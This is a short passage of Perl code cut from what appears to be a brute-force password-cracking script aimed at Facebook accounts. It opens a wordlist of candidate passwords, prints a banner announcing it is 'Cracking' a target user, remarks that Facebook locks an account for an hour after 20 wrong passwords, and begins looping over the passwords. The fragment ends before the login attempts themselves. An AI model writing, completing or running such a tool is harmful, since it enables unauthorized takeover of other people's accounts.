...
open (PASSFILE, $passwords) || die "usage %prog  <targetuser>  /wordlists/ \n";
# Start Cracking  ! 
print "Passwords File: ($passwords)\n--------[CTRL + C] To Stop Task--------- \n Facebook blocks account for 1 hour after 20 wrong passwords \nCracking  $usernames ..\n";
while (my $password = <PASSFILE>) {
chomp ($password);
